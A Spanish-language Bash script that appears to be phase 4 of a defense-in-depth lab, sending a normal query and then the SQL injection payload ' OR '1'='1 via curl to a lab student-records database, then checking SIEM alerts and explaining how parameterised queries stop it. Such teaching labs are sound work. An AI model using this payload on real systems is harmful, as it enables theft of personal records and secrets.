#!/bin/bash
# ================================================================
# FASE 4 — Inyección SQL: Ataque a la Base de Datos SUNIVER
# DS5.17 COBIT — Defensa en Profundidad
# Ejecutar desde el contenedor attacker: bash /scripts/attack_phase4.sh
# ================================================================

DB_URL="http://172.29.0.60:5050"
SIEM_URL="http://172.29.0.30:5601"
BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

echo ""
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}${CYAN}  FASE 4 — Inyección SQL · Base de Datos SUNIVER${RESET}"
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "  Sistema  : SUNIVER — Portal Estudiantil USFX"
echo -e "  Objetivo : Base de Datos → ${DB_URL}"
echo -e "  Atacante : 172.29.0.10 (Kali Linux)"
echo -e "  Meta     : Robar expedientes y token DTIC sin credenciales"
echo ""

# ── Consulta legítima ──────────────────────────────────────────
echo -e "${BOLD}[PASO 1]${RESET} Consulta legítima — buscando un estudiante por CI..."
echo ""
curl -s "${DB_URL}/search?ci=1234567" \
     | python3 -m json.tool 2>/dev/null || \
  curl -s "${DB_URL}/search?ci=1234567"
echo ""

# ── Payload de inyección SQL ────────────────────────────────────
echo -e "${BOLD}[PASO 2]${RESET} Inyectando payload SQL para volcar toda la tabla SUNIVER..."
echo -e "${YELLOW}  → Payload: ci=' OR '1'='1${RESET}"
echo -e "${YELLOW}  → Objetivo: exponer expedientes de TODOS los estudiantes + token DTIC${RESET}"
echo ""
curl -s -G "${DB_URL}/search" --data-urlencode "ci=' OR '1'='1" \
     | python3 -m json.tool 2>/dev/null || \
  curl -s -G "${DB_URL}/search" --data-urlencode "ci=' OR '1'='1"
echo ""

# ── Verificar SIEM ────────────────────────────────────────────
echo -e "${BOLD}[PASO 3]${RESET} Verificando alertas en el SIEM..."
echo ""
curl -s "${SIEM_URL}/logs" \
     | python3 -c "
import json,sys
logs = json.load(sys.stdin)
sqli = [l for l in logs if 'SQLI' in l['type']]
print(f'  Eventos SQLi registrados: {len(sqli)}')
for l in sqli[-3:]:
    print(f\"  [{l['severity']}] {l['type']}: {l['message'][:90]}\")
" 2>/dev/null || echo "  (Ver dashboard SIEM en http://localhost:5601)"
echo ""

# ── Resultado ────────────────────────────────────────────────
echo -e "${BOLD}${RED}╔════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${RED}║  RESULTADO: depende del modo de protección de la Base de Datos  ║${RESET}"
echo -e "${BOLD}${RED}╚════════════════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${GREEN}  DEFENSA ACTIVA (por defecto):${RESET} Consultas parametrizadas — el payload"
echo -e "  se trata como texto literal. La BD devuelve 0 resultados para un"
echo -e "  CI inexistente y registra un WARNING en el SIEM."
echo ""
echo -e "${YELLOW}  SIN PROTECCIÓN (panel admin → Desactivar):${RESET} La consulta concatena"
echo -e "  el input del atacante directamente. '1'='1' siempre es verdadero:"
echo -e "  se filtran TODOS los registros, incluido el token DTIC (CRITICAL en SIEM)."
echo ""
echo -e "  ${CYAN}→ Ver alerta en http://localhost:5601${RESET}"
echo -e "  ${CYAN}→ Ver portal SUNIVER en http://localhost:7000${RESET}"
echo -e "  ${CYAN}→ Desactivar protección: http://localhost:8080 → Base de Datos → Desactivar${RESET}"
echo ""
